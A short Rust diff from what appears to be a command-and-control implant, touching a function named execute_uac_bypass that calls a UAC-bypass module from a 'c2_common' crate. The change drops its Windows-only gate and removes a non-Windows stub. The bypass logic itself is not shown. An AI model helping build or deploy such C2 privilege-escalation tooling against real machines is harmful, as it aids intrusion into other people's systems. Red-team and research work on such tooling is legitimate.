@@ -13,7 +13,6 @@ use super::CommandResult;
 ///
 /// # Returns
 /// CommandResult with success/error message
-#[cfg(windows)]
 pub fn execute_uac_bypass(command: &str) -> CommandResult {
     use c2_common::uacme::UacBypass;
 
@@ -54,9 +53,4 @@ pub fn execute_uac_bypass(command: &str) -> CommandResult {
             e
         )),
     }
-}
-
-#[cfg(not(windows))]
-pub fn execute_uac_bypass(_command: &str) -> CommandResult {
-    CommandResult::Error("UAC Bypass is only available on Windows systems.".to_string())
 }
